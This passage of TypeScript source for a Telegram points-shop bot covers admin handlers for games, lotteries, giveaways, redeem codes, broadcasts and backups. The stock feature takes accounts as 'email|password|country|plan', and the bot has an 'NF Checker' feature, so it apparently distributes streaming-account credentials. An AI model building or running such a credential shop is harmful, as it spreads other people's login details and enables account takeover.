              if (!isBotOwner(tgUserId)) await storage.addGamePoints(user.id, betAmount);
              await bot.sendMessage(chatId, `🃏 ${visual}`, { parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "🔄 Play Again", callback_data: `play:blackjack:${betAmount}` }], [{ text: "🔙 Back", callback_data: "game_back" }]] } });
              return;
            }
            visual += won ? "🎉 You beat the dealer!" : "😢 Dealer wins!";
            await resolveGameResult(chatId, tgUserId, "blackjack", betAmount, won, visual);
            return;
          }
        }
        return;
      }

      if (query.data === "game_enable") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin access required!", show_alert: true });
        isGameEnabled = true;
        saveGameState();
        await bot.answerCallbackQuery(query.id, { text: "✅ Game enabled!" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        await bot.sendMessage(chatId, "🎮 Game has been enabled for all users!", adminMenu());
        return;
      }

      if (query.data === "game_disable") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin access required!", show_alert: true });
        isGameEnabled = false;
        saveGameState();
        await bot.answerCallbackQuery(query.id, { text: "❌ Game disabled!" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        await bot.sendMessage(chatId, "🎮 Game has been disabled.", adminMenu());
        return;
      }

      if (query.data === "spin_enable") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin access required!", show_alert: true });
        isDailySpinEnabled = true;
        saveGameState();
        await bot.answerCallbackQuery(query.id, { text: "✅ Daily Spin enabled!" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        await bot.sendMessage(chatId, "🎡 Daily Spin has been enabled for all users!", adminMenu());
        return;
      }

      if (query.data === "spin_disable") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin access required!", show_alert: true });
        isDailySpinEnabled = false;
        saveGameState();
        await bot.answerCallbackQuery(query.id, { text: "❌ Daily Spin disabled!" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        await bot.sendMessage(chatId, "🎡 Daily Spin has been disabled.", adminMenu());
        return;
      }

      // Gift All confirm callbacks
      if (query.data === "gift_confirm_yes") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        const state = pending[tgUserId];
        if (!state || state.action !== "gift_all_confirm") return bot.answerCallbackQuery(query.id, { text: "❌ Session expired. Try again.", show_alert: true });
        const amount = state.data?.amount;
        delete pending[tgUserId];
        await bot.answerCallbackQuery(query.id);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        const count = await storage.addAllUsersPoints(amount);
        await bot.sendMessage(chatId, `🎁 Gifted ${amount} points to ${count} users! Notifying them...`, adminMenu());
        const allUsers = await storage.getAllUsers();
        let notified = 0;
        for (const u of allUsers) {
          if (u.isBanned || !u.chatId) continue;
          try {
            await bot.sendMessage(Number(u.chatId),
              `🎁 Gift from Admin!\n${"─".repeat(30)}\n\nAn admin has gifted you <b>${amount} points</b>!\n\n💰 Your new balance: ${(u.points || 0)} points\n\nEnjoy! 🎉`,
              { parse_mode: "HTML" }
            );
            notified++;
          } catch {}
        }
        await bot.sendMessage(chatId, `✅ Notified ${notified}/${count} users about the gift!`, adminMenu());
        return;
      }

      if (query.data === "gift_confirm_no") {
        delete pending[tgUserId];
        await bot.answerCallbackQuery(query.id, { text: "❌ Gift cancelled." });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        await bot.sendMessage(chatId, "❌ Gift cancelled.", adminMenu());
        return;
      }

      if (query.data === "lottery_start") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        lotteryActive = true;
        lotteryPrize = 1;
        lotteryPool.length = 0;
        await bot.answerCallbackQuery(query.id, { text: "✅ Lottery started!" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        await bot.sendMessage(chatId, "🎰 Lottery has been started! Broadcasting to all users...", adminMenu());
        const allUsers = await storage.getAllUsers();
        let sent = 0;
        for (const u of allUsers) {
          if (u.isBanned || !u.chatId || String(u.telegramId) === String(tgUserId)) continue;
          try {
            await bot.sendMessage(Number(u.chatId),
              `🎰 <b>LOTTERY IS NOW OPEN!</b>\n${"─".repeat(30)}\n\n🎫 Entry: FREE\n🏆 Prize: 1 point\n\nTap the button below to join now!`,
              {
                parse_mode: "HTML",
                reply_markup: {
                  inline_keyboard: [[{ text: "🎫 Join Lottery (FREE)", callback_data: "lottery_join" }]],
                },
              }
            );
            sent++;
          } catch {}
        }
        await bot.sendMessage(chatId, `✅ Lottery broadcast sent to ${sent} users!`, adminMenu());
        return;
      }

      if (query.data === "lottery_draw") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        if (lotteryPool.length === 0) return bot.answerCallbackQuery(query.id, { text: "❌ No players in lottery!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        const winner = lotteryPool[Math.floor(Math.random() * lotteryPool.length)];
        const winnerUser = await storage.getUserByTelegramId(String(winner.odId));
        if (winnerUser) {
          await storage.addPoints(winnerUser.id, 1);
          if (winnerUser.chatId) {
            try {
              await bot.sendMessage(Number(winnerUser.chatId),
                `🎰🏆 <b>YOU WON THE LOTTERY!</b> 🏆🎰\n${"─".repeat(30)}\n\n💰 Prize: <b>1 point</b>\n👥 Total Players: ${lotteryPool.length}\n\n🎉 Congratulations!`,
                { parse_mode: "HTML" }
              );
            } catch {}
          }
        }
        const resultMsg = `🎰 Lottery Results!\n${"─".repeat(30)}\n\n🏆 Winner: @${esc(winner.username)}\n💰 Prize: 1 point\n👥 Total Players: ${lotteryPool.length}\n\n🎉 Congratulations!`;
        lotteryActive = false;
        lotteryPrize = 1;
        lotteryPool.length = 0;
        await bot.sendMessage(chatId, resultMsg, { parse_mode: "HTML", ...adminMenu() });
        return;
      }

      if (query.data === "lottery_cancel") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        lotteryActive = false;
        lotteryPrize = 1;
        lotteryPool.length = 0;
        await bot.sendMessage(chatId, `❌ Lottery cancelled!`, adminMenu());
        return;
      }

      if (query.data === "lottery_join") {
        if (!lotteryActive) return bot.answerCallbackQuery(query.id, { text: "❌ No lottery active!", show_alert: true });
        const lUser = await storage.getUserByTelegramId(String(tgUserId));
        if (!lUser) return bot.answerCallbackQuery(query.id, { text: "Use /start first!", show_alert: true });
        const existing = lotteryPool.find(e => e.odId === tgUserId);
        if (existing) return bot.answerCallbackQuery(query.id, { text: "You already joined!", show_alert: true });
        lotteryPool.push({ odId: tgUserId, username: lUser.username, ticketCount: 1 });
        await bot.answerCallbackQuery(query.id, { text: `✅ Joined! ${lotteryPool.length} players` });
        try {
          await bot.editMessageText(
            `🎰 <b>LOTTERY IS NOW OPEN!</b>\n${"─".repeat(30)}\n\n🎫 Entry: FREE\n🏆 Prize: 1 point\n👥 Players: ${lotteryPool.length}\n\n✅ You have joined!`,
            {
              chat_id: chatId,
              message_id: messageId,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [[{ text: "✅ Already Joined", callback_data: "noop" }]],
              },
            }
          );
        } catch {}
        return;
      }

      if (query.data === "giveaway_join") {
        if (!giveaway.active) return bot.answerCallbackQuery(query.id, { text: "❌ No active giveaway!", show_alert: true });
        const gUser = await storage.getUserByTelegramId(String(tgUserId));
        if (!gUser) return bot.answerCallbackQuery(query.id, { text: "Use /start first!", show_alert: true });
        const already = giveaway.participants.find(p => p.odId === tgUserId);
        if (already) return bot.answerCallbackQuery(query.id, { text: "You already joined!", show_alert: true });
        if (giveaway.requiredReferrals > 0) {
          const refs = await storage.getReferredUsers(gUser.id);
          if (refs.length < giveaway.requiredReferrals) {
            return bot.answerCallbackQuery(query.id, { text: `❌ You need ${giveaway.requiredReferrals} referrals to join! You have ${refs.length}.`, show_alert: true });
          }
        }
        giveaway.participants.push({ odId: tgUserId, username: gUser.username });
        await bot.answerCallbackQuery(query.id, { text: `✅ Joined! ${giveaway.participants.length} participants` });
        const timeLeft = formatTimeLeft(giveaway.endTime - Date.now());
        try {
          await bot.editMessageText(
            `🎁 <b>GIVEAWAY IS ACTIVE!</b>\n${"─".repeat(30)}\n\n🏆 Prize: 1 point\n👥 Participants: ${giveaway.participants.length}\n⏳ Ends in: ${timeLeft}\n${giveaway.requiredReferrals > 0 ? `📨 Required Referrals: ${giveaway.requiredReferrals}\n` : ""}\n✅ You have joined!`,
            {
              chat_id: chatId,
              message_id: messageId,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [[{ text: "✅ Already Joined", callback_data: "noop" }]],
              },
            }
          );
        } catch {}
        return;
      }

      if (query.data === "giveaway_cancel") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        if (giveaway.timer) clearTimeout(giveaway.timer);
        giveaway.active = false;
        giveaway.participants = [];
        await bot.answerCallbackQuery(query.id, { text: "✅ Giveaway cancelled!" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return bot.sendMessage(chatId, "❌ Giveaway cancelled!", adminMenu());
      }

      if (query.data === "giveaway_draw_now") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        if (giveaway.timer) clearTimeout(giveaway.timer);
        await bot.answerCallbackQuery(query.id);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        await endGiveaway();
        return bot.sendMessage(chatId, "✅ Giveaway drawn!", adminMenu());
      }

      if (query.data === "giveaway_toggle_on") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        isGiveawayEnabled = true;
        saveGameState();
        await bot.answerCallbackQuery(query.id, { text: "✅ Giveaway enabled for users!" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return bot.sendMessage(chatId, "🎁 Giveaway button is now <b>enabled</b> for all users!", { ...adminMenu(), parse_mode: "HTML" });
      }

      if (query.data === "giveaway_toggle_off") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        isGiveawayEnabled = false;
        saveGameState();
        await bot.answerCallbackQuery(query.id, { text: "❌ Giveaway disabled for users!" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return bot.sendMessage(chatId, "🎁 Giveaway button is now <b>disabled</b> for users.", { ...adminMenu(), parse_mode: "HTML" });
      }

      if (query.data === "giveaway_start_new") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        pending[tgUserId] = { action: "giveaway_setup" };
        return bot.sendMessage(chatId,
          `🎁 <b>Start Giveaway</b>\n${"─".repeat(30)}\n\n` +
          `Send the settings in this format:\n\n` +
          `<code>duration referrals</code>\n\n` +
          `<b>Duration:</b> time in minutes (e.g. 60 = 1 hour)\n` +
          `<b>Referrals:</b> required referrals to join (0 = no requirement)\n\n` +
          `<b>Examples:</b>\n` +
          `<code>30 0</code> — 30 min, no referral needed\n` +
          `<code>60 3</code> — 1 hour, need 3 referrals\n` +
          `<code>1440 5</code> — 24 hours, need 5 referrals\n\n` +
          `Send or /cancel:`,
          { parse_mode: "HTML" }
        );
      }

      // Rating
      if (query.data?.startsWith("rate:")) {
        const rating = query.data.split(":")[1];
        if (rating === "cancel") {
          await bot.answerCallbackQuery(query.id, { text: "Rating cancelled" });
          try { await bot.deleteMessage(chatId, messageId); } catch {}
          return;
        }
        const ratingNum = parseInt(rating);
        ratingPending[tgUserId] = { rating: ratingNum };
        await bot.answerCallbackQuery(query.id, { text: "Thanks for rating!" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        await bot.sendMessage(chatId,
          `⭐ Thanks for rating us ${ratingNum} stars!\n\nWould you like to leave feedback? (optional)\nJust type your feedback, or send /skip to continue.`,
          { parse_mode: "HTML" }
        );
        pending[Number(tgUserId)] = { action: "rating_feedback" };
        return;
      }

      // Delete Stock
      if (query.data?.startsWith("del_stock_pick:")) {
        const itemId = query.data.split(":")[1];
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const item = await storage.getItem(itemId);
        if (!item) return bot.sendMessage(chatId, "Item not found.");
        const available = await storage.getAvailableCodeCount(itemId);
        return bot.sendMessage(chatId,
          `🗑 Delete Stock for: ${item.name}\n📦 Available codes: ${available}\n\nChoose what to delete:`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "🗑 Delete Available Only (unused)", callback_data: `del_stock_avail:${itemId}` }],
                [{ text: "🗑 Delete ALL (used + unused)", callback_data: `del_stock_all:${itemId}` }],
                [{ text: "❌ Cancel", callback_data: "del_stock_cancel" }],
              ],
            },
          }
        );
      }

      if (query.data?.startsWith("del_stock_avail:")) {
        const itemId = query.data.split(":")[1];
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id, { text: "Deleting..." });
        const count = await storage.deleteStockCodesAvailable(itemId);
        const item = await storage.getItem(itemId);
        await storage.updateItem(itemId, { stock: 0 });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return bot.sendMessage(chatId, `✅ Deleted ${count} available code(s) from ${item?.name || "item"}.`, adminMenu());
      }

      if (query.data?.startsWith("del_stock_all:")) {
        const itemId = query.data.split(":")[1];
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id, { text: "Deleting all..." });
        const count = await storage.deleteStockCodes(itemId);
        const item = await storage.getItem(itemId);
        await storage.updateItem(itemId, { stock: 0 });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return bot.sendMessage(chatId, `✅ Deleted all ${count} code(s) from ${item?.name || "item"}.`, adminMenu());
      }

      if (query.data === "del_stock_cancel") {
        await bot.answerCallbackQuery(query.id, { text: "Cancelled" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return;
      }

      // Redeem code wizard callbacks
      if (query.data === "rc_create") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        pending[Number(tgUserId)] = { action: "rc_step1_name" };
        return bot.sendMessage(chatId, `🎟️ Create Redeem Code — Step 1/3\n${"─".repeat(30)}\n\n📝 Enter the code name:\n\n<i>Example: netflix-vip</i>`, { parse_mode: "HTML" });
      }

      if (query.data?.startsWith("rc_pts:")) {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const pts = parseInt(query.data.split(":")[1]);
        const state = pending[Number(tgUserId)];
        if (!state) return;
        if (pts === 0) {
          pending[Number(tgUserId)] = { action: "rc_step2_custom_pts", data: state.data };
          return bot.sendMessage(chatId, `✏️ Enter custom points amount:`, { parse_mode: "HTML" });
        }
        pending[Number(tgUserId)] = { action: "rc_step3_uses", data: { ...state.data, points: pts } };
        return bot.sendMessage(chatId,
          `🎟️ Create Redeem Code — Step 2/2\n${"─".repeat(30)}\n\n🎟️ Code: ${esc(state.data?.codeName || "")}\n💰 Points: ${pts}\n\n👥 How many users can use this code?`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "1 user", callback_data: "rc_uses:1" }, { text: "5 users", callback_data: "rc_uses:5" }, { text: "10 users", callback_data: "rc_uses:10" }],
                [{ text: "25 users", callback_data: "rc_uses:25" }, { text: "50 users", callback_data: "rc_uses:50" }, { text: "100 users", callback_data: "rc_uses:100" }],
                [{ text: "♾ Unlimited (9999)", callback_data: "rc_uses:9999" }],
                [{ text: "✏️ Custom number", callback_data: "rc_uses:0" }],
              ],
            },
          }
        );
      }

      if (query.data?.startsWith("rc_uses:")) {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const uses = parseInt(query.data.split(":")[1]);
        const state = pending[Number(tgUserId)];
        if (!state) return;
        if (uses === 0) {
          pending[Number(tgUserId)] = { action: "rc_step3_custom_uses", data: state.data };
          return bot.sendMessage(chatId, `✏️ Enter custom max uses:`, { parse_mode: "HTML" });
        }
        delete pending[Number(tgUserId)];
        const rc = await storage.createRedeemCode(state.data.codeName, state.data.points, uses, String(tgUserId));
        return bot.sendMessage(chatId,
          `✅ Redeem Code Created!\n${"─".repeat(30)}\n\n🎟️ Code: ${esc(rc.code)}\n💰 Points: ${rc.points}\n👥 Max uses: ${rc.maxUses}\n\n📢 Share this with users:\n/redeem ${esc(rc.code)}`,
          { parse_mode: "HTML", ...adminMenu() }
        );
      }

      if (query.data === "rc_delete_pick") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const codes = await storage.getAllRedeemCodes();
        if (codes.length === 0) return bot.sendMessage(chatId, "No codes to delete.");
        const buttons = codes.map(rc => [{ text: `🗑 ${rc.code} (${rc.points} pts)`, callback_data: `rc_delete:${rc.id}` }]);
        return bot.sendMessage(chatId, "🗑 Pick a code to delete:", { parse_mode: "HTML", reply_markup: { inline_keyboard: buttons } });
      }

      if (query.data?.startsWith("rc_delete:")) {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id, { text: "Deleting..." });
        const codeId = query.data.split(":")[1];
        await storage.deleteRedeemCode(codeId);
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return bot.sendMessage(chatId, "✅ Code deleted.", adminMenu());
      }

      // Broadcast
      if (query.data === "broadcast_yes") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        const state = pending[Number(tgUserId)];
        if (!state || state.action !== "broadcast_confirm") return bot.answerCallbackQuery(query.id, { text: "❌ No broadcast pending.", show_alert: true });
        const broadcastMsg = state.data.message;
        delete pending[Number(tgUserId)];
        await bot.answerCallbackQuery(query.id, { text: "Sending..." });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        const allUsers = await storage.getAllUsers();
        let sent = 0, failed = 0;
        const chunkSize = 20;
        for (let i = 0; i < allUsers.length; i += chunkSize) {
          const chunk = allUsers.slice(i, i + chunkSize);
          await Promise.all(chunk.map(async (u: any) => {
            if (!u.chatId || u.isBanned) return;
            try { await bot.sendMessage(u.chatId, broadcastMsg); sent++; } catch { failed++; }
          }));
          if (i + chunkSize < allUsers.length) await new Promise(r => setTimeout(r, 500));
        }
        return bot.sendMessage(chatId, `📢 Broadcast done!\n✅ Sent: ${sent}\n❌ Failed: ${failed}`, { parse_mode: "HTML", ...adminMenu() });
      }

      if (query.data === "broadcast_no") {
        delete pending[Number(tgUserId)];
        await bot.answerCallbackQuery(query.id, { text: "Cancelled" });
        try { await bot.deleteMessage(chatId, messageId); } catch {}
        return bot.sendMessage(chatId, "❌ Broadcast cancelled.", adminMenu());
      }

      if (query.data?.startsWith("stockalert:")) {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id, { text: "Sending alerts..." });
        const targetId = query.data.split(":")[1];
        const allUsers = await storage.getAllUsers();
        let alertMsg = "";
        if (targetId === "all") {
          const storeItems = await storage.getItems();
          const itemEmojis = ["⭐", "💎", "🔥", "⚡", "🎁", "🚀", "👑", "🎉"];
          alertMsg = `🔔 <b>NEW STOCK AVAILABLE!</b>\n${"─".repeat(30)}\n\n`;
          storeItems.forEach((item, i) => {
            const emoji = itemEmojis[i % itemEmojis.length];
            const stockTxt = item.stock !== null && item.stock !== undefined ? item.stock : "∞";
            alertMsg += `${emoji} <b>${esc(item.name)}</b> — ${item.price} pts | Stock: ${stockTxt}\n`;
          });
          alertMsg += `\n🛒 Open the bot now to grab yours!\n👉 @${BOT_USERNAME}`;
        } else {
          const item = await storage.getItem(targetId);
          if (!item) return bot.sendMessage(chatId, "❌ Item not found.", adminMenu());
          const stockTxt = item.stock !== null && item.stock !== undefined ? item.stock : "∞";
          alertMsg = `🔔 <b>STOCK ALERT!</b>\n${"─".repeat(30)}\n\n⭐ <b>${esc(item.name)}</b>\n💰 Price: ${item.price} pts\n📦 Stock: ${stockTxt}\n${item.description ? `📝 ${esc(item.description)}\n` : ""}\n🛒 Hurry up before it runs out!\n👉 @${BOT_USERNAME}`;
        }
        let sent = 0, failed = 0;
        for (const u of allUsers) {
          if (!u.chatId || u.isBanned) continue;
          try { await bot.sendMessage(Number(u.chatId), alertMsg, { parse_mode: "HTML" }); sent++; } catch { failed++; }
        }
        return bot.sendMessage(chatId, `🔔 Stock Alert Sent!\n\n✅ Delivered: ${sent}\n❌ Failed: ${failed}`, adminMenu());
      }

      if (query.data === "lock_shop") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        isShopLocked = !isShopLocked;
        saveGameState();
        await bot.answerCallbackQuery(query.id, { text: `Shop ${isShopLocked ? "locked 🔒" : "unlocked 🔓"}` });
        return bot.sendMessage(chatId, `🛍️ Shop is now ${isShopLocked ? "🔒 <b>Locked</b>" : "🔓 <b>Unlocked</b>"}`, { parse_mode: "HTML", ...adminMenu() });
      }

      if (query.data === "lock_checker") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        isCheckerLocked = !isCheckerLocked;
        saveGameState();
        await bot.answerCallbackQuery(query.id, { text: `Checker ${isCheckerLocked ? "locked 🔒" : "unlocked 🔓"}` });
        return bot.sendMessage(chatId, `🔑 NF Checker is now ${isCheckerLocked ? "🔒 <b>Locked</b>" : "🔓 <b>Unlocked</b>"}`, { parse_mode: "HTML", ...adminMenu() });
      }

      if (query.data === "lock_transfer") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        isTransferLocked = !isTransferLocked;
        saveGameState();
        await bot.answerCallbackQuery(query.id, { text: `Transfers ${isTransferLocked ? "locked 🔒" : "unlocked 🔓"}` });
        return bot.sendMessage(chatId, `💸 Transfers are now ${isTransferLocked ? "🔒 <b>Locked</b>" : "🔓 <b>Unlocked</b>"}`, { parse_mode: "HTML", ...adminMenu() });
      }

      if (query.data === "export_logs") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id, { text: "Exporting logs..." });
        loadActivityLogs();
        let fileContent = `📋 ACTIVITY LOGS — ${new Date().toISOString()}\n${"═".repeat(50)}\n\n`;
        const typeEmoji: Record<string, string> = { purchase: "🛒", transfer: "💸", game: "🎮", redeem: "🎟️", checker: "🔑" };
        for (const log of activityLogs) {
          const d = new Date(log.timestamp);
          const time = `${d.getDate()}/${d.getMonth() + 1}/${d.getFullYear()} ${d.getHours().toString().padStart(2, "0")}:${d.getMinutes().toString().padStart(2, "0")}`;
          fileContent += `${typeEmoji[log.type] || "📌"} [${time}] @${log.username}\n   ${log.details}\n${"─".repeat(30)}\n`;
        }
        const tmpFile = path.join("/tmp", `activity_logs_${Date.now()}.txt`);
        fs.writeFileSync(tmpFile, fileContent, "utf-8");
        await bot.sendDocument(chatId, tmpFile, { caption: `📋 Activity Logs Export\n📊 Total: ${activityLogs.length} entries` });
        try { fs.unlinkSync(tmpFile); } catch {}
        return;
      }

      if (query.data === "clear_logs") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        activityLogs = [];
        saveActivityLogs();
        await bot.answerCallbackQuery(query.id, { text: "Logs cleared! ✅" });
        return bot.sendMessage(chatId, "🗑 Activity logs cleared!", adminMenu());
      }

      // Backup
      if (query.data === "backup_users") {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id, { text: "Generating users backup..." });
        const allUsers = await storage.getAllUsers();
        let fileContent = `👥 USERS BACKUP - ${new Date().toISOString()}\n${"=".repeat(40)}\n\n`;
        for (const u of allUsers) {
          const pts = typeof u.points === "number" ? Math.floor(u.points) : u.points;
          const gPts = typeof u.gamePoints === "number" ? Math.floor(u.gamePoints || 0) : (u.gamePoints || 0);
          fileContent += `ID: ${u.id}\nTelegram ID: ${u.telegramId}\nUsername: @${u.username}\nPoints: ${pts}\nGame Points: ${gPts}\nReferred By: ${u.referredBy || "None"}\nReferral Code: ${u.referralCode || "N/A"}\nBanned: ${u.isBanned ? "Yes" : "No"}\nWarnings: ${u.warnings || 0}\nGames Played: ${u.gamesPlayed || 0}\nGames Won: ${u.gamesWon || 0}\nCreated: ${u.createdAt || "N/A"}\n${"─".repeat(30)}\n`;
        }
        const tmpFile = path.join("/tmp", `users_backup_${Date.now()}.txt`);
        fs.writeFileSync(tmpFile, fileContent, "utf-8");
        await bot.sendDocument(chatId, tmpFile, { caption: `👥 Users Data Backup\n📅 ${new Date().toLocaleString()}\n👥 Total: ${allUsers.length} users`, parse_mode: "HTML" });
        try { fs.unlinkSync(tmpFile); } catch {}
        return;
      }

      if (query.data === "backup_codes") {
        if (!isBotOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Owner only!", show_alert: true });
        await bot.answerCallbackQuery(query.id, { text: "Generating backup..." });
        const allCodes = await storage.getAllStockCodes();
        if (allCodes.length === 0) return bot.sendMessage(chatId, "📦 No codes in database yet.");
        let fileContent = `STOCK CODES BACKUP — ${new Date().toISOString()}\n${"═".repeat(50)}\n\n`;
        const grouped: Record<string, { available: string[]; used: string[] }> = {};
        for (const code of allCodes) {
          const item = await storage.getItem(code.itemId);
          const itemName = item?.name || "Unknown";
          if (!grouped[itemName]) grouped[itemName] = { available: [], used: [] };
          const line = code.claimed ? `${code.code}  [USED]` : code.code;
          if (code.claimed) grouped[itemName].used.push(line);
          else grouped[itemName].available.push(line);
        }
        for (const [itemName, data] of Object.entries(grouped)) {
          fileContent += `📦 ${itemName}\n${"─".repeat(40)}\n✅ Available (${data.available.length}):\n`;
          data.available.forEach(c => { fileContent += `  ${c}\n`; });
          fileContent += `\n❌ Used (${data.used.length}):\n`;
          data.used.forEach(c => { fileContent += `  ${c}\n`; });
          fileContent += `\n`;
        }
        const tmpFile = path.join("/tmp", `backup_codes_${Date.now()}.txt`);
        fs.writeFileSync(tmpFile, fileContent, "utf-8");
        await bot.sendDocument(chatId, tmpFile, { caption: `📦 Stock Codes Backup\n📅 ${new Date().toLocaleString()}\n📦 Total: ${allCodes.length} codes`, parse_mode: "HTML" });
        try { fs.unlinkSync(tmpFile); } catch {}
        return;
      }

      if (query.data === "backup_source") {
        if (!isBotOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Owner only!", show_alert: true });
        await bot.answerCallbackQuery(query.id, { text: "Generating source backup..." });
        await sendSourceBackupToOwner();
        return;
      }

      // FIX: Add stock inline button pick
      if (query.data?.startsWith("addstock_pick:")) {
        if (!await isAdminOrOwner(tgUserId)) return bot.answerCallbackQuery(query.id, { text: "⛔ Admin only!", show_alert: true });
        await bot.answerCallbackQuery(query.id);
        const itemId = query.data.split(":")[1];
        const item = await storage.getItem(itemId);
        if (!item) return bot.sendMessage(chatId, "❌ Item not found.", adminMenu());
        pending[Number(tgUserId)] = { action: "add_stock", data: { itemId: item.id } };
        return bot.sendMessage(chatId,
          `📦 Adding codes for: ${item.name}\n\nSend accounts using | to separate fields:\nemail|password|country|plan\n\n✅ You can send 1 account or many (one per line)\n✅ Keep sending more — each message adds to stock\n✅ Send /done when finished\n\nExample:\nemail@gmail.com|pass123|US|Premium`,
          { parse_mode: "HTML" }
        );
      }

    } catch (err: any) {
      console.error("Error in callback_query:", err.message);
    }
  });

  // MESSAGE HANDLER
  bot.on("message", async (msg) => {
    const currentTime = Date.now();
    const userId = msg.from?.id;

    if (userId) {
      // FIX: Check storage temp ban and auto-expire
      const userRecord = await storage.getUserByTelegramId(String(userId));
      if (userRecord) {
        const stillBanned = await storage.isTempBanned(userRecord.id);
        if (userRecord.isBanned && !stillBanned && !userRecord.tempBanUntil) {
          // Permanently banned
        } else if (stillBanned) {
          return;
        }
      }

      const banExpiry = tempBans.get(userId);
      if (banExpiry && Date.now() < banExpiry) return;
      if (banExpiry && Date.now() >= banExpiry) tempBans.delete(userId);

      const lastMsgTime = rateLimit.get(userId) || 0;
      if (currentTime - lastMsgTime < 200) {
        const warnings = (spamWarnings.get(userId) || 0) + 1;
        spamWarnings.set(userId, warnings);
        if (warnings === 5) {
          bot.sendMessage(msg.chat.id, "⚠️ <b>Warning:</b> You are sending messages too fast. Please slow down.", { parse_mode: "HTML" }).catch(() => {});
        } else if (warnings >= 10) {
